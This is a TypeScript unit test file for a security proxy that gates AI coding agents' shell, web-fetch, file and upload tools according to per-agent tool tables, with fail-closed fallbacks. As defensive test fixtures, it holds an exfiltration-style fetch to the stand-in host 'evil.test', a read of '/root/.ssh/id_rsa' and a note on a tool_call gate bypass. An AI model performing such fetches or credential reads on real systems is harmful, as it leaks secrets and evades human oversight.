/**
 * gate-surface — the per-agent tool surface the proxy's gates read
 * (src/gate-surface.ts; the tables live in arbiter/policy/tool-gate-surface.ts).
 *
 * Per gate: Claude Code unchanged (the default), OpenCode and OpenClaw gated on
 * their OWN names, and an arbiter that cannot say leaves the UNION of every
 * agent's table (so an OpenCode / OpenClaw session keeps its gates exactly
 * when the arbiter misbehaves). The surfaces below are the
 * arbiter's answers as they travel the wire.
 *
 * Run: npm run test:unit
 */
import { test } from "node:test";
import assert from "node:assert/strict";

import {
  CLAUDE_CODE_GATE_SURFACE,
  UNION_GATE_SURFACE,
  GateSurfaceCache,
  parseGateSurface,
  type GateSurface,
} from "../../src/gate-surface.js";
import { gateExecToolUse, EXEC_BLOCK_EXIT_CODE } from "../../src/exec-gate.js";
import { gateNetToolUse, netToolSymbols, DENIED_HOST } from "../../src/net-gate.js";
import { gateToolUseInput } from "../../src/fs-gate.js";
import { labelWrittenPaths } from "../../src/fs-label.js";
import { ViewMap } from "../../src/view-map.js";
import { detectCapabilities, originFor } from "../../src/rewrite-request.js";
import { MockArbiter } from "../helpers/mock-arbiter.js";
import type { Arbiter } from "../../src/arbiter-client.js";

const OPENCODE: GateSurface = {
  spec: "opencode",
  exec: { bash: "command" },
  execOutput: { bash: "command" },
  net: { webfetch: { destination: "url", symbols: "url" }, websearch: { destination: null, symbols: "query" } },
  paths: {
    read: { fields: ["filePath"], mode: "read" },
    glob: { fields: ["path"], mode: "read" },
    grep: { fields: ["path"], mode: "read" },
    write: { fields: ["filePath"], mode: "write" },
    edit: { fields: ["filePath"], mode: "write" },
  },
  dispatch: {},
  refuse: {},
  refuseArgs: {},
  stdin: {},
  patch: {},
  upload: {},
  replyMedia: null,
};
const OPENCLAW: GateSurface = {
  spec: "openclaw-agent",
  exec: { exec: "command" },
  execOutput: { exec: "command", process: "command" },
  net: { web_fetch: { destination: "url", symbols: "url" }, web_search: { destination: null, symbols: "query" } },
  paths: {
    read: { fields: ["path", "file_path"], mode: "read" },
    write: { fields: ["path", "file_path"], mode: "write" },
    edit: { fields: ["path", "file_path"], mode: "write" },
  },
  dispatch: { tool_call: "openclaw-tool-call", tool_search_code: "refuse" },
  refuse: { terminal: "terminal runs outside the sandbox" },
  refuseArgs: {},
  stdin: {},
  patch: { apply_patch: { field: "input", format: "apply-patch" } },
  upload: {},
  replyMedia: "openclaw-media-lines",
};

const SYM = "$MDU:bash[a1b2]";

// ── parse + cache ────────────────────────────────────────────────────────────

test("parseGateSurface: the arbiter's shape round-trips; any malformed part rejects the WHOLE answer", () => {
  assert.deepEqual(parseGateSurface(JSON.parse(JSON.stringify(OPENCODE))), OPENCODE);
  assert.equal(parseGateSurface(null), null);
  assert.equal(parseGateSurface({ ...OPENCODE, exec: { bash: 1 } }), null);
  assert.equal(parseGateSurface({ ...OPENCODE, net: { webfetch: { destination: 3, symbols: "url" } } }), null);
  assert.equal(parseGateSurface({ ...OPENCODE, paths: { read: { fields: ["filePath"], mode: "delete" } } }), null);
  assert.equal(parseGateSurface({ ...OPENCODE, paths: { read: { fields: [""], mode: "read" } } }), null);
  assert.equal(parseGateSurface({ ...OPENCODE, spec: undefined }), null);
  assert.equal(parseGateSurface({ ...OPENCODE, dispatch: { tool_call: "run" } }), null);
  assert.equal(parseGateSurface({ ...OPENCODE, dispatch: ["tool_call"] }), null);
});

test("parseGateSurface: an arbiter that predates the dispatch table gets the union's dispatchers (a missed dispatcher is the tool_call bypass)", () => {
  const { dispatch: _d, ...old } = OPENCLAW;
  assert.deepEqual(parseGateSurface(JSON.parse(JSON.stringify(old)))!.dispatch, UNION_GATE_SURFACE.dispatch);
  assert.deepEqual(parseGateSurface(JSON.parse(JSON.stringify(OPENCLAW)))!.dispatch, OPENCLAW.dispatch);
});

test("parseGateSurface: the refuse table round-trips; absent (an older arbiter) ⇒ the union's refusals; malformed rejects the whole answer", () => {
  assert.deepEqual(parseGateSurface(JSON.parse(JSON.stringify(OPENCLAW)))!.refuse, OPENCLAW.refuse);
  const { refuse: _r, ...old } = OPENCLAW;
  assert.deepEqual(parseGateSurface(JSON.parse(JSON.stringify(old)))!.refuse, UNION_GATE_SURFACE.refuse);
  assert.ok(UNION_GATE_SURFACE.refuse["terminal"], "the union refuses OpenClaw's terminal");
  assert.equal(parseGateSurface({ ...OPENCLAW, refuse: { terminal: 1 } }), null);
  assert.equal(parseGateSurface({ ...OPENCLAW, refuse: { terminal: "" } }), null);
  assert.equal(parseGateSurface({ ...OPENCLAW, refuse: ["terminal"] }), null);
});

test("parseGateSurface: refuseArgs, stdin and a net tool's block mode round-trip; absent (an older arbiter) ⇒ the union's; malformed rejects the whole answer", () => {
  const withForms: GateSurface = {
    ...OPENCLAW,
    net: { ...OPENCLAW.net, message: { destination: null, symbols: "message", block: "refuse" } },
    refuseArgs: { exec: [{ field: "host", allow: ["", "gateway"], reason: "host=node runs elsewhere" }] },
    stdin: { process: "openclaw-process" },
  };
  assert.deepEqual(parseGateSurface(JSON.parse(JSON.stringify(withForms))), withForms);
  const { refuseArgs: _a, stdin: _s, ...old } = withForms;
  const parsedOld = parseGateSurface(JSON.parse(JSON.stringify(old)))!;
  assert.deepEqual(parsedOld.refuseArgs, UNION_GATE_SURFACE.refuseArgs);
  assert.deepEqual(parsedOld.stdin, UNION_GATE_SURFACE.stdin);
  assert.ok(UNION_GATE_SURFACE.refuseArgs["exec"], "the union refuses exec{host: node}");
  assert.equal(UNION_GATE_SURFACE.stdin["process"], "openclaw-process");
  assert.equal(parseGateSurface({ ...withForms, net: { message: { destination: null, symbols: "message", block: "drop" } } }), null);
  assert.equal(parseGateSurface({ ...withForms, refuseArgs: { exec: { field: "host" } } }), null);
  assert.equal(parseGateSurface({ ...withForms, refuseArgs: { exec: [{ field: "", allow: [], reason: "r" }] } }), null);
  assert.equal(parseGateSurface({ ...withForms, refuseArgs: { exec: [{ field: "host", allow: [1], reason: "r" }] } }), null);
  assert.equal(parseGateSurface({ ...withForms, stdin: { process: "shell" } }), null);
});

test("parseGateSurface: further destinations, media references and the patch table round-trip; absent patch (an older arbiter) ⇒ the union's; malformed rejects the whole answer", () => {
  const residue: GateSurface = {
    ...OPENCLAW,
    net: {
      ...OPENCLAW.net,
      browser: { destination: "targetUrl", symbols: "targetUrl", alsoDestinations: ["url"], block: "refuse" },
      image: { destination: null, symbols: "prompt", alsoDestinations: ["image", "images"], block: "refuse" },
    },
    paths: { ...OPENCLAW.paths, exec: { fields: ["workdir"], mode: "read" }, image: { fields: ["image", "images"], mode: "read", refs: "media" } },
  };
  assert.deepEqual(parseGateSurface(JSON.parse(JSON.stringify(residue))), residue);
  const { patch: _p, ...old } = residue;
  assert.deepEqual(parseGateSurface(JSON.parse(JSON.stringify(old)))!.patch, UNION_GATE_SURFACE.patch);
  assert.deepEqual(UNION_GATE_SURFACE.patch, { apply_patch: { field: "input", format: "apply-patch" } }, "the union gates apply_patch");
  assert.equal(parseGateSurface({ ...residue, net: { image: { destination: null, symbols: "prompt", alsoDestinations: "image" } } }), null);
  assert.equal(parseGateSurface({ ...residue, net: { image: { destination: null, symbols: "prompt", alsoDestinations: [""] } } }), null);
  assert.equal(parseGateSurface({ ...residue, paths: { image: { fields: ["image"], mode: "read", refs: "url" } } }), null);
  assert.equal(parseGateSurface({ ...residue, patch: { apply_patch: { field: "input", format: "unified-diff" } } }), null);
  assert.equal(parseGateSurface({ ...residue, patch: { apply_patch: { field: "", format: "apply-patch" } } }), null);
  assert.equal(parseGateSurface({ ...residue, patch: ["apply_patch"] }), null);
});

test("parseGateSurface: the upload table round-trips; absent (an older arbiter) ⇒ the union's (DesignSync and the Artifact tools stay gated); malformed rejects the whole answer", () => {
  const CC_UPLOAD = {
    DesignSync: "claude-design-sync", Artifact: "claude-artifact", ArtifactData: "claude-artifact-data", ArtifactComments: "claude-artifact-comments",
  } as const;
  const claude: GateSurface = { ...OPENCODE, spec: "claude-code", upload: { ...CC_UPLOAD } };
  assert.deepEqual(parseGateSurface(JSON.parse(JSON.stringify(claude))), claude);
  const OPENCLAW_UPLOAD = {
    message: "openclaw-message",
    view_image: "openclaw-media", image: "openclaw-media", pdf: "openclaw-media",
    image_generate: "openclaw-media", music_generate: "openclaw-media", video_generate: "openclaw-media",
    browser: "openclaw-browser-upload",
  } as const;
  const { upload: _u, ...old } = claude;
  assert.deepEqual(parseGateSurface(JSON.parse(JSON.stringify(old)))!.upload, { ...CC_UPLOAD, ...OPENCLAW_UPLOAD });
  assert.deepEqual(UNION_GATE_SURFACE.upload, { ...CC_UPLOAD, ...OPENCLAW_UPLOAD });
  // OpenClaw's table round-trips too (2026-10-17)
  const oc: GateSurface = { ...OPENCODE, spec: "openclaw-agent", upload: { ...OPENCLAW_UPLOAD } };
  assert.deepEqual(parseGateSurface(JSON.parse(JSON.stringify(oc))), oc);
  assert.deepEqual(CLAUDE_CODE_GATE_SURFACE.upload, CC_UPLOAD);
  // an older arbiter's table (DesignSync alone) is taken as answered
  assert.deepEqual(parseGateSurface({ ...claude, upload: { DesignSync: "claude-design-sync" } })!.upload, { DesignSync: "claude-design-sync" });
  assert.equal(parseGateSurface({ ...claude, upload: { DesignSync: "upload" } }), null);
  assert.equal(parseGateSurface({ ...claude, upload: { Artifact: "claude-artifacts" } }), null, "an unknown kind rejects the whole answer");
  assert.equal(parseGateSurface({ ...claude, upload: ["DesignSync"] }), null);
});

test("parseGateSurface: relativeBase round-trips; absent is unknown (the union claims none); any other value rejects the whole answer", () => {
  const withBase: GateSurface = { ...OPENCODE, relativeBase: "launch" };
  assert.deepEqual(parseGateSurface(JSON.parse(JSON.stringify(withBase))), withBase);
  assert.equal(parseGateSurface(JSON.parse(JSON.stringify(OPENCODE)))!.relativeBase, undefined);
  assert.equal(UNION_GATE_SURFACE.relativeBase, undefined, "a session no table names gets no base");
  assert.equal(parseGateSurface({ ...OPENCODE, relativeBase: "cwd" }), null);
});

test("parseGateSurface: replyMedia round-trips (null: the agent attaches nothing its reply names); absent (an older arbiter) ⇒ the union's, which reads every reply; any other value rejects the whole answer", () => {
  assert.equal(parseGateSurface(JSON.parse(JSON.stringify(OPENCLAW)))!.replyMedia, "openclaw-media-lines");
  assert.equal(parseGateSurface(JSON.parse(JSON.stringify(OPENCODE)))!.replyMedia, null);
  const { replyMedia: _r, ...old } = OPENCODE;
  assert.equal(parseGateSurface(JSON.parse(JSON.stringify(old)))!.replyMedia, "openclaw-media-lines");
  assert.equal(UNION_GATE_SURFACE.replyMedia, "openclaw-media-lines");
  assert.equal(CLAUDE_CODE_GATE_SURFACE.replyMedia, undefined, "Claude Code attaches nothing its reply names");
  assert.equal(parseGateSurface({ ...OPENCODE, replyMedia: "markdown-images" }), null);
  assert.equal(parseGateSurface({ ...OPENCODE, replyMedia: true }), null);
});

test("the union reads the media tools' reference arrays as media paths, and their URLs as further destinations", () => {
  const want: Record<string, string[]> = {
    pdf: ["pdf", "pdfs"],
    image_generate: ["image", "images"],
    music_generate: ["image", "images"],
    video_generate: ["image", "images", "video", "videos", "audioRef", "audioRefs"],
  };
  for (const [tool, fields] of Object.entries(want)) {
    assert.deepEqual(UNION_GATE_SURFACE.paths[tool], { fields, mode: "read", refs: "media" }, tool);
    assert.deepEqual(UNION_GATE_SURFACE.net[tool]!.alsoDestinations, fields, tool);
    assert.equal(UNION_GATE_SURFACE.net[tool]!.block, "refuse", tool);
  }
});

test("GateSurfaceCache: an arbiter without the op → the union of every agent's table (logged once)", async () => {
  const logs: string[] = [];
  const c = new GateSurfaceCache({}, { log: (m) => logs.push(m) });
  assert.equal(await c.get("s"), UNION_GATE_SURFACE);
  assert.equal(await c.get("s"), UNION_GATE_SURFACE);
  assert.equal(logs.length, 1);
});

test("GateSurfaceCache: an answer is cached per session within the TTL, re-asked after it", async () => {
  let t = 0;
  const calls: Array<string | undefined> = [];
  const c = new GateSurfaceCache(
    { gateSurface: async (r) => { calls.push(r.sessionKey); return OPENCODE; } },
    { now: () => t, ttlMs: 1000 },
  );
  assert.equal((await c.get("a")).spec, "opencode");
  assert.equal((await c.get("a")).spec, "opencode");
  assert.deepEqual(calls, ["a"]);
  t = 1500;
  await c.get("a");
  await c.get(undefined);
  assert.deepEqual(calls, ["a", "a", undefined]);
});

test("GateSurfaceCache: a throw, a malformed answer and a timeout each fall back to the union and are NOT cached", async () => {
  let mode: "throw" | "bad" | "hang" | "ok" = "throw";
  const c = new GateSurfaceCache(
    {
      gateSurface: async () => {
        if (mode === "throw") throw new Error("down");
        if (mode === "bad") return { spec: "opencode" };
        if (mode === "hang") return new Promise(() => {});
        return OPENCODE;
      },
    },
    { timeoutMs: 30 },
  );
  assert.equal(await c.get("s"), UNION_GATE_SURFACE);
  mode = "bad";
  assert.equal(await c.get("s"), UNION_GATE_SURFACE);
  mode = "hang";
  assert.equal(await c.get("s"), UNION_GATE_SURFACE);
  mode = "ok";
  assert.equal((await c.get("s")).spec, "opencode", "the next request asks again");
});

test("the union fallback is a superset of every agent's table, and every Claude Code tool keeps its exact entry (a no-op for a Claude Code session)", () => {
  for (const t of [CLAUDE_CODE_GATE_SURFACE, OPENCODE, OPENCLAW]) {
    for (const [k, v] of Object.entries(t.exec)) assert.equal(UNION_GATE_SURFACE.exec[k], v, `exec ${k}`);
    for (const [k, v] of Object.entries(t.execOutput)) assert.equal(UNION_GATE_SURFACE.execOutput[k], v, `execOutput ${k}`);
    for (const [k, v] of Object.entries(t.net)) assert.equal(UNION_GATE_SURFACE.net[k]!.symbols, v.symbols, `net ${k}`);
    for (const [k, v] of Object.entries(t.paths)) for (const f of v.fields) assert.ok(UNION_GATE_SURFACE.paths[k]!.fields.includes(f), `${k}.${f}`);
  }
  for (const [k, v] of Object.entries(CLAUDE_CODE_GATE_SURFACE.paths)) assert.deepEqual(UNION_GATE_SURFACE.paths[k], v);
  for (const [k, v] of Object.entries(CLAUDE_CODE_GATE_SURFACE.net)) assert.deepEqual(UNION_GATE_SURFACE.net[k], v);
  // the names the union adds are never Claude Code tool names
  for (const k of [...Object.keys(UNION_GATE_SURFACE.exec), ...Object.keys(UNION_GATE_SURFACE.net), ...Object.keys(UNION_GATE_SURFACE.paths)]) {
    if (!(k in CLAUDE_CODE_GATE_SURFACE.exec) && !(k in CLAUDE_CODE_GATE_SURFACE.net) && !(k in CLAUDE_CODE_GATE_SURFACE.paths)) {
      assert.match(k, /^[a-z_]+$/, `${k}: an added name is lowercase / snake_case`);
    }
  }
});

// ── exec gate ────────────────────────────────────────────────────────────────

test("exec gate: opencode `bash.command` / openclaw `exec.command` with a symbol in command position → the block sentinel", async () => {
  for (const [s, tool] of [[OPENCODE, "bash"], [OPENCLAW, "exec"]] as const) {
    const arbiter = new MockArbiter();
    const r = await gateExecToolUse(tool, { command: `bash -c "${SYM}"`, workdir: "/w" }, { arbiter, commandFields: s.exec });
    assert.equal(r.outcome?.decision, "block", `${s.spec} ${tool}`);
    assert.match(String(r.input["command"]), new RegExp(`exit ${EXEC_BLOCK_EXIT_CODE}$`));
    assert.equal(r.input["workdir"], "/w", "sibling fields untouched");
    assert.equal(arbiter.execGateCalls.length, 1);
  }
});

test("exec gate: Claude Code unchanged by default; another agent's names are not Claude's", async () => {
  const arbiter = new MockArbiter();
  assert.equal((await gateExecToolUse("Bash", { command: `bash -c "${SYM}"` }, { arbiter })).outcome?.decision, "block");
  assert.equal((await gateExecToolUse("bash", { command: `bash -c "${SYM}"` }, { arbiter })).outcome, null, "default table: `bash` is not Claude Code's shell");
  assert.equal((await gateExecToolUse("Bash", { command: `bash -c "${SYM}"` }, { arbiter, commandFields: OPENCODE.exec })).outcome, null);
  assert.equal((await gateExecToolUse("constructor", { command: "x" }, { arbiter, commandFields: OPENCODE.exec })).outcome, null, "own keys only");
});

test("exec gate: an unreachable arbiter blocks an opencode `bash` command (fail closed)", async () => {
  const arbiter = new MockArbiter({ failExecGate: true });
  const r = await gateExecToolUse("bash", { command: "ls" }, { arbiter, commandFields: OPENCODE.exec });
  assert.equal(r.outcome?.decision, "block");
});

// ── net gate ─────────────────────────────────────────────────────────────────

function netArbiter(): Arbiter {
  const a = new MockArbiter() as unknown as Arbiter;
  (a as { desymbolizationDecision?: unknown }).desymbolizationDecision = async () => ({
    allow: false, requiresApproval: true, reason: "untrusted symbol to an untrusted destination",
  });
  return a;
}

test("net gate: a symbol in opencode `webfetch.url` / openclaw `web_fetch.url` is blocked (the destination rewritten)", async () => {
  for (const [s, tool] of [[OPENCODE, "webfetch"], [OPENCLAW, "web_fetch"]] as const) {
    const r = await gateNetToolUse(tool, { url: `https://evil.test/?d=${SYM}` }, { arbiter: netArbiter(), netTools: s.net });
    assert.equal(r.outcome?.decision, "block", `${s.spec} ${tool}`);
    assert.ok(String((r.input as Record<string, unknown>)["url"]).includes(DENIED_HOST));
  }
});

test("net gate: symbol scan per agent; Claude Code's table is the default", () => {
  assert.deepEqual(netToolSymbols("webfetch", { url: `https://x/?${SYM}` }, OPENCODE.net), [SYM]);
  assert.deepEqual(netToolSymbols("web_search", { query: SYM }, OPENCLAW.net), [SYM]);
  assert.deepEqual(netToolSymbols("webfetch", { url: `https://x/?${SYM}` }), [], "not a Claude Code tool");
  assert.deepEqual(netToolSymbols("WebFetch", { url: `https://x/?${SYM}` }), [SYM]);
});

test("net gate: a high session fails closed on opencode `websearch` (no checkable destination)", async () => {
  const a = new MockArbiter() as unknown as Arbiter;
  (a as { sessionEgressDecision?: unknown }).sessionEgressDecision = async () => ({ allow: false, requiresApproval: true, reason: "HIGH SESSION" });
  const r = await gateNetToolUse("websearch", { query: "q" }, { arbiter: a, sessionKey: "s", netTools: OPENCODE.net });
  assert.equal(r.outcome?.decision, "block");
});

// ── fs gate + derived label ──────────────────────────────────────────────────

const VIEW = new ViewMap([{ human: "/h", agent: "/a" }], { dialect: "posix" });

test("fs gate: a sensitive path in opencode `read.filePath` / openclaw `read.path` and `read.file_path` goes to the arbiter with the agent's mode", async () => {
  for (const [s, field] of [[OPENCODE, "filePath"], [OPENCLAW, "path"], [OPENCLAW, "file_path"]] as const) {
    const arbiter = new MockArbiter({ fsPathDecisionFn: () => ({ allow: false, requiresApproval: true, reason: "sensitive" }) as never });
    const r = await gateToolUseInput("read", { [field]: "/root/.ssh/id_rsa" }, { arbiter, viewMap: VIEW, pathTools: s.paths });
    assert.ok(r && r.gated.length === 1, `${s.spec} read.${field}`);
    assert.match(String(r!.input[field]), /^\/mandu\/denied\//);
    assert.equal(arbiter.fsPathDecisionCalls[0]!.mode, "read");
  }
  const arbiter = new MockArbiter();
  assert.equal(await gateToolUseInput("read", { filePath: "/root/.ssh/id_rsa" }, { arbiter, viewMap: VIEW }), null, "default = Claude Code: `read` is not its tool");
});

test("derived label: opencode `write.filePath` is labeled as a write; `read` is not", async () => {
  const seen: string[] = [];
  const arbiter = { labelWrittenPath: async (r: { path: string }) => { seen.push(r.path); return { labeled: true, level: "public", reason: "ok" }; } } as unknown as Arbiter;
  const w = await labelWrittenPaths("write", { filePath: "/h/out.txt", content: "x" }, { arbiter, sessionKey: "s", pathTools: OPENCODE.paths });
  assert.equal(w?.writes.length, 1);
  assert.equal(await labelWrittenPaths("read", { filePath: "/h/in.txt" }, { arbiter, sessionKey: "s", pathTools: OPENCODE.paths }), null);
  assert.deepEqual(seen, ["/h/out.txt"]);
});

// ── view map ─────────────────────────────────────────────────────────────────

test("view map: opencode `read.filePath` and `bash.command` are forward-mapped with the agent's surface; without it they are unknown tools", () => {
  const r = VIEW.rewriteToolUseInput("read", { filePath: "/h/notes.md" }, "forward", OPENCODE);
  assert.deepEqual(r?.input, { filePath: "/a/notes.md" });
  const b = VIEW.rewriteToolUseInput("bash", { command: "cat /h/notes.md" }, "forward", OPENCODE);
  assert.deepEqual(b?.input, { command: "cat /a/notes.md" });
  assert.equal(VIEW.rewriteToolUseInput("read", { filePath: "/h/notes.md" }, "forward"), null);
  const claude = VIEW.rewriteToolUseInput("Read", { file_path: "/h/notes.md" }, "forward");
  assert.deepEqual(claude?.input, { file_path: "/a/notes.md" }, "Claude Code unchanged by default");
});

// ── handling-prompt capability + origin ──────────────────────────────────────

test("capabilities: opencode's lowercase `bash` counts as the exec tool when the surface names it", () => {
  const tools = [{ name: "bash", input_schema: { type: "object", properties: { command: {} } } }];
  assert.equal(detectCapabilities(tools).exec, false, "not in the fixed name set");
  const c = detectCapabilities(tools, {}, OPENCODE.exec);
  assert.equal(c.exec, true);
  assert.equal(c.execEnv, false, "opencode bash declares no env: the schema-less exec guidance");
  const oc = detectCapabilities([{ name: "exec", input_schema: { type: "object", properties: { command: {}, env: {} } } }], {}, OPENCLAW.exec);
  assert.equal(oc.exec && oc.execEnv, true);
});

test("originFor: the agent's command / path / URL field; Claude Code's switch unchanged", () => {
  assert.equal(originFor("bash", { command: "ls" }, OPENCODE), "ls");
  assert.equal(originFor("read", { filePath: "/h/a" }, OPENCODE), "/h/a");
  assert.equal(originFor("read", { path: "/h/b" }, OPENCLAW), "/h/b");
  assert.equal(originFor("web_fetch", { url: "https://x/" }, OPENCLAW), "https://x/");
  assert.equal(originFor("Read", { file_path: "/h/c" }, CLAUDE_CODE_GATE_SURFACE), "/h/c");
  assert.equal(originFor("Bash", { command: "pwd" }), "pwd");
  // the union fallback: Claude Code names keep the canonical switch, others use the table
  assert.equal(originFor("NotebookEdit", { notebook_path: "/h/n.ipynb" }, UNION_GATE_SURFACE), "/h/n.ipynb");
  assert.equal(originFor("WebSearch", { query: "q" }, UNION_GATE_SURFACE), "q");
  assert.equal(originFor("read", { filePath: "/h/d" }, UNION_GATE_SURFACE), "/h/d");
});
